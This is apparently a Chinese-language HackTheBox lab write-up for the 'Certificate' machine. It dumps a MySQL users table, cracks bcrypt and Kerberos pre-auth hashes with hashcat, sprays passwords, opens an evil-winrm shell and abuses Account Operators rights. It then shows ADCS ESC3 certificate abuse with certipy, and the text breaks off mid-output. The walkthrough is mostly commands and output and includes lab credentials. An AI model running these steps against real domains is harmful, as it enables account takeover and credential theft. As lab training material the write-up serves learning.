<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\mysql\bin&gt; .\mysql.exe -u <span class="string">&quot;certificate_webapp_user&quot;</span> -p<span class="string">&quot;cert!f!c@teDBPWD&quot;</span> -e <span class="string">&quot;show databases;&quot;</span></span><br><span class="line">Database</span><br><span class="line">certificate_webapp_db</span><br><span class="line">information_schema</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line"><span class="comment"># 这里注意使用双引号</span></span><br><span class="line">PS C:\xampp\mysql\bin&gt; .\mysql.exe -u <span class="string">&quot;certificate_webapp_user&quot;</span> -p<span class="string">&quot;cert!f!c@teDBPWD&quot;</span> -D <span class="string">&quot;certificate_webapp_db&quot;</span> -e <span class="string">&quot;show tables;&quot;</span></span><br><span class="line">Tables_in_certificate_webapp_db</span><br><span class="line">course_sessions</span><br><span class="line">courses</span><br><span class="line"><span class="built_in">users</span></span><br><span class="line">users_courses</span><br><span class="line"></span><br><span class="line">PS C:\xampp\mysql\bin&gt; .\mysql.exe -u <span class="string">&quot;certificate_webapp_user&quot;</span> -p<span class="string">&quot;cert!f!c@teDBPWD&quot;</span> -D <span class="string">&quot;certificate_webapp_db&quot;</span> -e <span class="string">&quot;select * from users;&quot;</span></span><br><span class="line"><span class="built_in">id</span>      first_name      last_name       username        email   password        created_at      role    is_active</span><br><span class="line">1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04<span class="variable">$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG</span>    2024-12-23 12:43:10     teacher 1</span><br><span class="line">6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04<span class="variable">$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj</span>.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1</span><br><span class="line">7       John    Wood    Johney  johny009@mail.com       $2y$04<span class="variable">$VaUEcSd6p5NnpgwnHyh8zey13zo</span>/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1</span><br><span class="line">8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04<span class="variable">$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti</span>    2024-12-24 09:08:04     teacher 1</span><br><span class="line">9       Steven  Roman   stev    steven@yahoo.com        $2y$04<span class="variable">$6FHP</span>.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1</span><br><span class="line">10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04<span class="variable">$CgDe</span>/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1</span><br><span class="line">12      ooa     ooa     ooa     ooa@ooa.ooa     $2y$04<span class="variable">$i4ayUfOuqDxO4lh1bkSli</span>.Qklrn2TkKx7Lufqp7jWkvbx1Kj.w5W2    2025-06-03 02:12:13     teacher 0</span><br><span class="line">13      hacker  hacker  hacker  hacker@gmail.com        $2y$04<span class="variable">$W</span>/b58ehBqKc9Pghh9Y8M..51/30.p2epwYIsJutFCy7AVSnxy8ANG    2025-06-03 02:27:41     student 1</span><br><span class="line">14      hackerteacher   hackerteacher   hackerteacher   hackerteacher@gmail.com $2y$04<span class="variable">$3KUXgL7VvxHDe508I2wY9OEhsWIdYA5Rfa52II6CTPKGIYzH8</span>/bFG    2025-06-03 02:30:09     teacher 0</span><br><span class="line">15      ooo     ooo     ooo     ooo@ooo.ooo     $2y$04<span class="variable">$1ufdOe3</span>/FQh5SNFxmaTgKeN2TmGe.uGRIcmROCfnX51V32pYd2HFq    2025-06-03 02:39:13     teacher 0</span><br><span class="line">16      wansh   wansh   wansh   wansh@certificate.htb   $2y$04<span class="variable">$rgg5t</span>.By4hNaxvI3A/0WF.ZW3f1qQ6aE.1u0sDbwK2kaimzE6pULa    2025-06-03 02:46:16     student 1</span><br><span class="line">17      aaa     aaa     aaa     aaa@aaa.aaa     $2y$04<span class="variable">$bEBVFPl3FY</span>/GdRRDOyaCF.5a1lKdcQVrv0Aj2azp85Vv87pEO6HBG    2025-06-03 02:58:19     teacher 0</span><br><span class="line">18      zxc     zxc     zxc     zxc@gmail.com   $2y$04<span class="variable">$5GKYBBhd</span>.ucWA60T9BAhb.hYbLB8yPjVIxxpqMlFL6SoUmPbk4aCm    2025-06-03 03:22:40     student 1</span><br></pre></td></tr></table></figure>
<p>出大货了，鼠鼠得吃，下一步就是看看能不能解</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cat</span> <span class="built_in">hash</span> | awk -F <span class="string">&#x27; &#x27;</span> <span class="string">&#x27;&#123;print $6&#125;&#x27;</span> | <span class="built_in">tee</span> <span class="built_in">hash</span> | <span class="built_in">cat</span></span><br><span class="line">$2y$04<span class="variable">$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG</span></span><br><span class="line">$2y$04<span class="variable">$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj</span>.i/dyvXNSqCkK</span><br><span class="line">$2y$04<span class="variable">$VaUEcSd6p5NnpgwnHyh8zey13zo</span>/hL7jfQd9U.PGyEW3yqBf.IxRq</span><br><span class="line">$2y$04<span class="variable">$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti</span></span><br><span class="line">$2y$04<span class="variable">$6FHP</span>.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2</span><br><span class="line">$2y$04<span class="variable">$CgDe</span>/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6</span><br><span class="line">$2y$04<span class="variable">$i4ayUfOuqDxO4lh1bkSli</span>.Qklrn2TkKx7Lufqp7jWkvbx1Kj.w5W2</span><br><span class="line">$2y$04<span class="variable">$W</span>/b58ehBqKc9Pghh9Y8M..51/30.p2epwYIsJutFCy7AVSnxy8ANG</span><br><span class="line">$2y$04<span class="variable">$3KUXgL7VvxHDe508I2wY9OEhsWIdYA5Rfa52II6CTPKGIYzH8</span>/bFG</span><br><span class="line">$2y$04<span class="variable">$1ufdOe3</span>/FQh5SNFxmaTgKeN2TmGe.uGRIcmROCfnX51V32pYd2HFq</span><br><span class="line">$2y$04<span class="variable">$rgg5t</span>.By4hNaxvI3A/0WF.ZW3f1qQ6aE.1u0sDbwK2kaimzE6pULa</span><br><span class="line">$2y$04<span class="variable">$bEBVFPl3FY</span>/GdRRDOyaCF.5a1lKdcQVrv0Aj2azp85Vv87pEO6HBG</span><br><span class="line">$2y$04<span class="variable">$5GKYBBhd</span>.ucWA60T9BAhb.hYbLB8yPjVIxxpqMlFL6SoUmPbk4aCm</span><br><span class="line"></span><br><span class="line">$ hashcat -a 0 -m 3200 <span class="built_in">hash</span> /usr/share/payloads/seclists/Passwords/Leaked-Databases/rockyou.txt --show</span><br><span class="line">$2y$04<span class="variable">$CgDe</span>/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6:Blink182</span><br><span class="line">$2y$04<span class="variable">$W</span>/b58ehBqKc9Pghh9Y8M..51/30.p2epwYIsJutFCy7AVSnxy8ANG:hacker</span><br></pre></td></tr></table></figure>
<p>解了两个，密码喷射一下<br>  但是猜测是sara.b的，因为里面的就他看着像hhh</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb/ldap/winrm 10.10.11.71 -u user -p <span class="string">&quot;Blink182&quot;</span> --continue-on-success</span><br><span class="line">SMB/LDAP/WINRM       10.10.11.71     5985   DC01             [+] certificate.htb\sara.b:Blink182 (Pwn3d!)</span><br></pre></td></tr></table></figure>
<p>成功撤离</p>
<h2 id="shell-as-sara-b"><a href="#shell-as-sara-b" class="headerlink" title="shell as sara.b"></a>shell as sara.b</h2><p>bloodhound一下，另外，faketime还是好用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&quot;+27514s&quot;</span> evil-winrm -i certificate.htb -u Sara.B -p <span class="string">&quot;Blink182&quot;</span>      </span><br><span class="line">/home/wansh/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">/home/wansh/.local/share/gem/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining <span class="string">&#x27;object_id&#x27;</span> may cause serious problems</span><br><span class="line">                                        </span><br><span class="line">Evil-WinRM shell v3.7</span><br><span class="line">                                        </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: undefined method <span class="string">&#x27;quoting_detection_proc&#x27;</span> <span class="keyword">for</span> module Reline</span><br><span class="line">                                        </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                        </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\Sara.B\Documents&gt; </span><br><span class="line"></span><br><span class="line">$ faketime -f <span class="string">&quot;+27514s&quot;</span> bloodhound-ce-python -u sara.b -p <span class="string">&quot;Blink182&quot;</span> -ns 10.10.11.71 -dc dc01.certificate.htb -c all --zip -d certificate.htb</span><br><span class="line">INFO: BloodHound.py <span class="keyword">for</span> BloodHound Community Edition</span><br><span class="line">INFO: Found AD domain: certificate.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">INFO: Connecting to LDAP server: dc01.certificate.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 3 computers</span><br><span class="line">INFO: Connecting to LDAP server: dc01.certificate.htb</span><br><span class="line">INFO: Found 19 <span class="built_in">users</span></span><br><span class="line">INFO: Found 58 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: WS-05.certificate.htb</span><br><span class="line">INFO: Querying computer: WS-01.certificate.htb</span><br><span class="line">INFO: Querying computer: DC01.certificate.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 30S</span><br><span class="line">INFO: Compressing output into 20250603184701_bloodhound.zip</span><br></pre></td></tr></table></figure>
<p><img src="/images/certificate-12.png"><br>sara.b在<code>DOMAIN USER</code>、<code>ACCOUNT OPERATORS</code>、<code>HELP DESK</code>三个用户组里面，其中其实account operators用户组特别一点<br>  Account Operators：账号操作员组，该组的成员可以创建和管理该域中的用户和组并为其设置权限，也可以在本地登录域控制器，但是，不能更改属于 Administrators 或 Domain Admins 组的账户，也不能修改这些组。在默认情况下，该组中没有成员。</p>
<p>而且在Documents文件夹下面有一个特殊的文件夹<code>WS-01</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01&gt; <span class="built_in">dir</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Sara.B\Documents\WS-01</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-a----        11/4/2024  12:44 AM            530 Description.txt</span><br><span class="line">-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01&gt; <span class="built_in">type</span> Description.txt</span><br><span class="line">The workstation 01 is not able to open the <span class="string">&quot;Reports&quot;</span> smb shared folder <span class="built_in">which</span> is hosted on DC01.</span><br><span class="line">When a user tries to input bad credentials, it returns bad credentials error.</span><br><span class="line">But when a user provides valid credentials the file explorer freezes and <span class="keyword">then</span> crashes!</span><br><span class="line">工作站 01 无法打开托管在 DC01 上的“Reports”SMB 共享文件夹。</span><br><span class="line">当用户尝试输入错误凭据时，它会返回错误凭据错误。</span><br><span class="line">但是，当用户提供有效凭据时，文件资源管理器会冻结并崩溃！</span><br></pre></td></tr></table></figure>
<p>下载下来看看</p>
<h3 id="account-operators"><a href="#account-operators" class="headerlink" title="account operators"></a>account operators</h3><p>这里可以直接利用组用户权限来更改用户密码，在Users下面找找用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01&gt; <span class="built_in">dir</span> <span class="string">&quot;C:\Users&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d-----       12/30/2024   8:33 PM                Administrator</span><br><span class="line">d-----       11/23/2024   6:59 PM                akeder.kh</span><br><span class="line">d-----        11/4/2024  12:55 AM                Lion.SK</span><br><span class="line">d-r---         6/3/2025   2:22 AM                Public</span><br><span class="line">d-----        11/3/2024   7:26 PM                Ryan.K</span><br><span class="line">d-----       11/26/2024   4:12 PM                Sara.B</span><br><span class="line">d-----       12/29/2024   5:30 PM                xamppuser</span><br></pre></td></tr></table></figure>
<p>这里用powerview试试，结合bloodhound挑选一下<br>其中lion.sk有remote management user组，改一下试试<br><img src="/images/certificate-13.png"><br>这样就成了哈哈哈</p>
<h3 id="Analyzing-pcap-files"><a href="#Analyzing-pcap-files" class="headerlink" title="Analyzing pcap files"></a>Analyzing pcap files</h3><p>下载看到的pcap文件<br>Google可以找到一些<a target="_blank" rel="noopener" href="https://github.com/mlgualtieri/NTLMRawUnHide">从pcap提取hash的工具</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$ python3 NTLMRawUnHide.py -i WS-01_PktMon.pcap -v -o result.txt</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cat</span> result.txt | awk -F <span class="string">&#x27;:&#x27;</span> <span class="string">&#x27;&#123;print $1&#125;&#x27;</span></span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br><span class="line">Administrator</span><br></pre></td></tr></table></figure>
<p>全是administrator，试着解一下<br>无解，打开pcap文件<br><img src="/images/certificate-14.png"><br>好多流量无处下手，Windows登录通常会设计kerberos，ntlm或smb协议，先看smb2（打开流量一眼就可以看到）<br><img src="/images/certificate-15.png"><br>这不都是我们刚刚脚本整理但是解不出来的，换Kerberos<br><img src="/images/certificate-16.png"><br>流量一下就少了，看一下两个，一个917的包一个922<br>917是发送到as的数据包，922是as发出来的数据包，用户密码主要保存在917的AS_REQ的加密时间戳当中<br><img src="/images/certificate-17.png"><br>hash格式一般是<code>$krb5pa$18$user$realm$cipher</code>，整理一下<br>  user:Lion.SK<br>  realm:CERTIFICATE.HTB<br>  cipher:23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0<br>  hash:$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0<br>hashcat解一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hashcat -a 0 -m 19900 lion.hash /usr/share/payloads/seclists/Passwords/Leaked-Databases/rockyou.txt </span><br><span class="line">$krb5pa$18<span class="variable">$Lion</span>.SK<span class="variable">$CERTIFICATE</span>.HTB<span class="variable">$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0</span>:!QAZ2wsx</span><br></pre></td></tr></table></figure>
<p>出来了，看一下是不是lion的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nxc smb/ldap/winrm 10.10.11.71 -u lion.sk -p <span class="string">&#x27;!QAZ2wsx&#x27;</span></span><br><span class="line">SMB/LDAP/WINRM       10.10.11.71     5985   DC01             [+] certificate.htb\lion.sk:!QAZ2wsx (Pwn3d!)</span><br></pre></td></tr></table></figure>
<h2 id="shell-as-lion-sk"><a href="#shell-as-lion-sk" class="headerlink" title="shell as lion.sk"></a>shell as lion.sk</h2><p><img src="/images/certificate-18.png"><br>看一下lion.sk都有啥<br><img src="/images/certificate-19.png"></p>
<h3 id="exploit-ESC3"><a href="#exploit-ESC3" class="headerlink" title="exploit ESC3"></a>exploit ESC3</h3><p>多能人才，他还在ADCS组里面，机器图标还是证书样式，找一下证书</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ certipy find -target dc01.certificate.htb -dc-ip 10.10.11.71 -u lion.sk -p <span class="string">&#x27;!QAZ2wsx&#x27;</span> </span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Finding certificate templates</span><br><span class="line">[*] Found 35 certificate templates</span><br><span class="line">[*] Finding certificate authorities</span><br><span class="line">[*] Found 1 certificate authority</span><br><span class="line">[*] Found 12 enabled certificate templates</span><br><span class="line">[*] Finding issuance policies</span><br><span class="line">[*] Found 18 issuance policies</span><br><span class="line">[*] Found 0 OIDs linked to templates</span><br><span class="line">[*] Retrieving CA configuration <span class="keyword">for</span> <span class="string">&#x27;Certificate-LTD-CA&#x27;</span> via RRP</span><br><span class="line">[!] Failed to connect to remote registry. Service should be starting now. Trying again...</span><br><span class="line">[*] Successfully retrieved CA configuration <span class="keyword">for</span> <span class="string">&#x27;Certificate-LTD-CA&#x27;</span></span><br><span class="line">[*] Checking web enrollment <span class="keyword">for</span> CA <span class="string">&#x27;Certificate-LTD-CA&#x27;</span> @ <span class="string">&#x27;DC01.certificate.htb&#x27;</span></span><br><span class="line">[!] Error checking web enrollment: timed out</span><br><span class="line">[!] Use -debug to <span class="built_in">print</span> a stacktrace</span><br><span class="line">[*] Saving text output to <span class="string">&#x27;20250603160111_Certipy.txt&#x27;</span></span><br><span class="line">[*] Wrote text output to <span class="string">&#x27;20250603160111_Certipy.txt&#x27;</span></span><br><span class="line">[*] Saving JSON output to <span class="string">&#x27;20250603160111_Certipy.json&#x27;</span></span><br><span class="line">[*] Wrote JSON output to <span class="string">&#x27;20250603160111_Certipy.json&#x27;</span></span><br></pre></td></tr></table></figure>
<p>找到一个ESC3的，再往下滑，找到好几个ESC3的<br><img src="/images/certificate-21.png"><br>要利用ESC3需要两个条件<br>  Obtaining an Enrollment Agent Certificate: The attacker must first acquire a certificate that includes the “Certificate Request Agent” EKU (Object Identifier 1.3.6.1.4.1.311.20.2.1). This can occur if:<br>  获取注册代理证书： 攻击者必须首先获取包含“证书请求代理”EKU （对象标识符 1.3.6.1.4.1.311.20.2.1） 的证书。如果出现以下情况，则可能会发生这种情况：</p>
<p>  A certificate template specifically designed to issue Enrollment Agent certificates (e.g., the built-in “EnrollmentAgent” template, “CEPEncryption” template, or a custom equivalent) has overly permissive enrollment rights, allowing the attacker (or a group they belong to, like “Domain Users”) to enroll.<br>  专门用于颁发注册代理证书的证书模板（例如，内置的“EnrollmentAgent”模板、“CEPEncryption”模板或自定义等效模板）具有过于宽松的注册权限，允许攻击者（或他们所属的组，如“域用户”）注册。<br>  A template vulnerable to ESC2 (“Any Purpose” EKU or no EKU) is enrollable by the attacker, as “Any Purpose” implicitly includes the “Certificate Request Agent” capability.<br>  攻击者可以注册易受 ESC2 攻击的模板（“任何用途”EKU 或无 EKU），因为“任何用途”隐含包含“证书请求代理”功能。<br>  A Target Certificate Template Allowing Agent Enrollment: There must be another certificate template (the “target template”) that:<br>  允许代理注册的目标证书模板： 必须有另一个证书模板（“目标模板”），该模板：</p>
<p>  Issues certificates suitable for authentication (e.g., it includes the “Client Authentication” EKU or “Smart Card Logon” EKU).<br>  颁发适合身份验证的证书 （例如，它包括“客户端身份验证”EKU 或“智能卡登录”EKU）。<br>  Is configured to allow an Enrollment Agent to request certificates on behalf of other users. Many default templates, particularly Schema Version 1 templates like the built-in “User” or “Machine” templates, inherently permit this without requiring specific enrollment agent restrictions in their issuance policy.<br>  配置为允许注册代理代表其他用户请求证书。许多默认模板，尤其是 Schema Version 1 模板（如内置的“User”或“Machine”模板）本身就允许这样做，而无需在其颁发策略中进行特定的注册代理限制。<br>  The intended victim (e.g., a Domain Administrator) must have enrollment rights on this target template.<br>  预期的受害者（例如，域管理员）必须具有此目标模板的注册权限。<br>先找包含EKU的证书<br><img src="/images/certificate-22.png"><br>在上面的时候就有了，然后再找另一个证书模板<br>上面请求中提到<code>SubjectRequireEmail</code>，看一下哪些用户有</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">╰─PV ❯ Get-DomainUser -Select sAMAccountName,mail -TableView </span><br><span class="line">[2025-06-04 09:56:12] [Formatter] Results from cache. Use <span class="string">&#x27;Clear-Cache&#x27;</span> or <span class="string">&#x27;-NoCache&#x27;</span> to refresh.</span><br><span class="line"></span><br><span class="line">sAMAccountName    mail</span><br><span class="line">----------------  -----------------------</span><br><span class="line">xamppuser</span><br><span class="line">saad.m            saad.m@certificate.htb</span><br><span class="line">karol.s</span><br><span class="line">Alex.D            alex.d@certificate.htb</span><br><span class="line">kara.m</span><br><span class="line">akeder.kh</span><br><span class="line">Ryan.K            ryan.k@certificate.htb</span><br><span class="line">Eva.F             eva.f@certificate.htb</span><br><span class="line">Lion.SK           lion.sk@certificate.htb</span><br><span class="line">Maya.K            maya.k@certificate.htb</span><br><span class="line">Nya.S             nya.s@certificate.htb</span><br><span class="line">Aya.W             aya.w@certificate.htb</span><br><span class="line">John.C            john.c@certificate.htb</span><br><span class="line">Sara.B            sara.b@certificate.htb</span><br><span class="line">Kai.X             kai.x@certificate.htb</span><br><span class="line">krbtgt</span><br><span class="line">Guest</span><br><span class="line">Administrator</span><br></pre></td></tr></table></figure>
<p><img src="/images/certificate-23.png"><br>请求一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ faketime -f <span class="string">&quot;+27511s&quot;</span> certipy req -u lion.sk@certificate.htb -p <span class="string">&#x27;!QAZ2wsx&#x27;</span> -dc-ip <span class="string">&#x27;10.10.11.71&#x27;</span> -target <span class="string">&#x27;dc01.certificate.htb&#x27;</span> -ca <span class="string">&#x27;Certificate-LTD-CA&#x27;</span> -template <span class="string">&#x27;Delegated-CRA&#x27;</span>       </span><br><span class="line">Certipy v5.0.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Request ID is 34</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;Lion.SK@certificate.htb&#x27;</span></span><br><span class="line">[*] Certificate object SID is <span class="string">&#x27;S-1-5-21-515537669-4223687196-3249690583-1115&#x27;</span></span><br><span class="line">[*] Saving certificate and private key to <span class="string">&#x27;lion.sk.pfx&#x27;</span></span><br><span class="line">[*] Wrote certificate and private key to <span class="string">&#x27;lion.sk.pfx&#x27;</span></span><br><span class="line"></span><br><span class="line">$ faketime -f <span class="string">&quot;+27511s&quot;</span> certipy req -u lion.sk@certificate.htb -p <span class="string">&#x27;!QAZ2wsx&#x27;</span> -dc-ip <span class="string">&#x27;10.10.11.71&#x27;</span> -target <span class="string">&#x27;dc01.certificate.htb&#x27;</span> -ca <span class="string">&#x27;Certificate-LTD-CA&#x27;</span> -template <span class="string">&#x27;SignedUser&#x27;</span> -pfx lion.sk.pfx -on-behalf-of <span class="string">&#x27;certificate\RYAN.K&#x27;</span></span><br><span class="line">Certipy v5.0.2 - by Oliver 